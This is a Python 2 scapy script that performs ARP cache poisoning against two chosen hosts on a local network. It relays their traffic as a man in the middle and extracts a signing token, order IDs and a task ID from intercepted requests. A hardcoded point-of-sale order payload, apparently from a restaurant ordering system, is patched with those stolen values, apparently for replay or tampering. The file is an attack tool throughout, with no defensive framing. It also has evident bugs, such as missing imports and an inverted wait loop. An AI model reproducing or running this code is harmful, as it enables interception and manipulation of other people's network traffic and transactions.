#!usr/local/bin/python
# -*- coding: utf8 -*-
from scapy.all import * 
import time,re
import threading
import urllib

def send_arp_pkg():
	global mac1,mac2,mac3,ip1,ip2,ip3
	print "---arp---"
	eth_orange_1=Ether(dst=mac2)
	ip_orange_1= ARP(op=1,hwsrc=mac3,psrc=ip1
		,hwdst=mac2,pdst=ip2)
	to_orange_1=(eth_orange_1/ip_orange_1)
	eth_orange_2=Ether(dst=mac2)
	ip_orange_2= ARP(op=2,hwsrc=mac3,psrc=ip1
		,hwdst=mac2,pdst=ip2)
	to_ip2=(eth_orange_2/ip_orange_2)
	eth_pos_1=Ether(dst=mac1)
	ip_pos_1= ARP(op=1,hwsrc=mac3,psrc=ip2
		,hwdst=mac1,pdst=ip1)
	to_pos_1=(eth_pos_1/ip_pos_1)
	eth_pos_2=Ether(dst=mac1)
	ip_pos_2= ARP(op=2,hwsrc=mac3,psrc=ip2
		,hwdst=mac1,pdst=ip1)
	to_ip1=(eth_pos_2/ip_pos_2)
	while 1:
		print 'arp'
		sendp(to_orange_1,verbose=False);sendp(to_ip2,verbose=False)
		sendp(to_pos_1,verbose=False);sendp(to_ip1,verbose=False)
		time.sleep(1)

def turn_from_ip2(pkt):
	global i,ip1,ip2,ip3,mac1,mac2,mac3
#	try:
#		string=pkt[TCP].payload[0]
#		print string
#	except Exception,e:
#		pass
	pkt["Ethernet"].dst=mac1;pkt["Ethernet"].src=mac3;
	sendp(pkt,verbose=False);print 'from ip2'
def sniff_ip2():
	global i,ip1,ip2,ip3,mac1,mac2,mac3
	while 1:
		try:
			_filter='ether src '+mac2+' and ether dst '+mac3+' and not arp'
			print _filter
			sniff(filter=_filter
				,iface="eth0",prn=turn_from_ip2)
		except Exception, e:
			pass
def turn_from_ip1(pkt):
	global i,ip1,ip2,ip3,mac1,mac2,mac3,string
	try:
		if(pkt[TCP].payload):
			string=pkt[TCP].payload[0]
			s="sign=b2cad2547c6d16dc35ad8594f70d0be6&entityId=00020325&content=%7B%22instanceForms%22%3A%5B%7B%22a_num%22%3A1.0%2C%22a_unit%22%3A%22%E4%BB%BD%22%2C%22add_prz%22%3A0.0%2C%22bsg%22%3Anull%2C%22c_id%22%3Anull%2C%22hasAddition%22%3A0%2C%22id%22%3A%220002032557fb83e10157fb8da317001a%22%2C%22is_r%22%3A1%2C%22is_w%22%3A0%2C%22kind%22%3A1%2C%22km_id%22%3A%22000203255678388b0156971f7c2069ac%22%2C%22m_id%22%3A%22000203255678388b0156971f7c3969b9%22%2C%22memo%22%3Anull%2C%22mk_id%22%3Anull%2C%22mk_name%22%3Anull%2C%22name%22%3A%22%E8%8A%B1%E6%9E%9D%E4%B8%B8%22%2C%22num%22%3A1.0%2C%22o_id%22%3A%220002032557fb83e10157fb8d9cd40019%22%2C%22op_id%22%3A%220002032555cf6a910156205560541140%22%2C%22orgn_prz%22%3A25.0%2C%22p_id%22%3Anull%2C%22pp_id%22%3A%22000203255678388b01574bc7493c4a86%22%2C%22priceMode%22%3A1%2C%22producePlansid%22%3Anull%2C%22prz%22%3A25.0%2C%22sd_id%22%3Anull%2C%22tst%22%3A%22%22%2C%22unit%22%3A%22%E4%BB%BD%22%2C%22w_id%22%3Anull%2C%22wk_id%22%3Anull%2C%22childId%22%3Anull%2C%22child%22%3Afalse%2C%22give%22%3Afalse%2C%22suitChild%22%3Afalse%7D%5D%2C%22memo%22%3Anull%2C%22menuTimeId%22%3Anull%2C%22offlineDeviceId%22%3A%221%22%2C%22opUserId%22%3A%220002032555cf6a910156205560541140%22%2C%22orderFrom%22%3A0%2C%22orderFromNum%22%3Anull%2C%22orderId%22%3A%220002032557fb83e10157fb8d9cd40019%22%2C%22peopleCount%22%3A4%2C%22seatId%22%3A%220002032554e26bb701555a8caaf77c1c%22%2C%22limitTime%22%3Atrue%2C%22print%22%3Atrue%2C%22wait%223Afalse%7D&areaId=0002032554e26bb701555a8caad97c15&seatId=0002032554e26bb701555a8caaf77c1c&type=1003&taskId=0002032557fb83e10157fb8daf51001b"
			m1=re.search(r'sign=\w{32}',str(string))
			m2=re.search(r'o_id%22%3A%22\w{32}%22%2C%22',str(string))
			m3=re.search(r'orderId%22%3A%22\w{32}%22%2C%22',str(string))
			m4=re.search(r'2id%22%3A%22\w{32}%22%2C%22',str(string))
			m5=re.search(r'taskId=\w+',str(string))
			if(m1.group and m2.group and m3.group and m4.group and m5.group):
				s=re.sub(r'sign=b2cad2547c6d16dc35ad8594f70d0be6',re.search(r'sign=\w{32}',str(string)).group(0), s, count=0, flags=0)
				s=re.sub(r"o_id%22%3A%220002032557fb83e10157fb8d9cd40019%22%2C%22",re.search(r'o_id%22%3A%22\w{32}%22%2C%22',str(string)).group(0), s, count=0, flags=0)
				s=re.sub(r"orderId%22%3A%220002032557fb83e10157fb8d9cd40019%22%2C%22",re.search(r'orderId%22%3A%22\w{32}%22%2C%22',str(string)).group(0), s, count=0, flags=0)
				s=re.sub(r"2id%22%3A%220002032557fb83e10157fb8da317001a%22%2C%22",re.search(r'2id%22%3A%22\w{32}%22%2C%22',str(string)).group(0), s, count=0, flags=0)
				s=re.sub(r"taskId=0002032557fb83e10157fb8daf51001b",re.search(r'taskId=\w{32}',str(string)).group(0), s, count=0, flags=0)
			

		
	except Exception,e:
		print str(e);
		pass
	pkt["Ethernet"].dst=mac2;pkt["Ethernet"].src=mac3;
	
	sendp(pkt,verbose=False);
	
	print 'from ip1'
def sniff_ip1():
	global mac1,mac2,mac3
	while 1:
		try:
			filter_='ether src '+mac1+' and ether dst '+mac3+' and not arp'
			print filter_
			sniff(filter= filter_
				,iface="eth0",prn=turn_from_ip1)
		except Exception, e:
			pass
def saveIP(pkt):
	global i,ip1,ip2,ip3,mac1,mac2,mac3
	
	print "---ready---"
	if(pkt["IP"].src==ip1):
		mac1=pkt["Ethernet"].src
		mac3=pkt["Ethernet"].dst
		i+=1
	if(pkt["IP"].src==ip2):
		mac2=pkt["Ethernet"].src
		ip3=pkt["IP"].dst
		i+=1
		
	
def get_ip():
	global mac1,mac2,mac3,ip1,ip2,ip3
	while 1:
		try:
			
			sniff(filter= "icmp and (ip src "+ip1+" or ip src "+ip2+" )",iface="eth0",prn=saveIP)
		except Exception, e:
			pass
i=0;

string=mac1=mac2=mac3=ip1=ip2=ip3=""
ip1=raw_input("dst ip1:")
ip2=raw_input("dst ip2:")
#ip1="192.168.123.55"
#ip2="192.168.123.81"

thread.start_new_thread(get_ip,())
time.sleep(1)
os.popen('ping -c 1 '+ip1)
os.popen('ping -c 1 '+ip2)

while i==2:
	time.sleep(1)
	pass
print "---start---"
print "---start---"

thread.start_new_thread(send_arp_pkg,())
thread.start_new_thread(sniff_ip2,())
thread.start_new_thread(sniff_ip1,())
while (True):
    time.sleep(1)
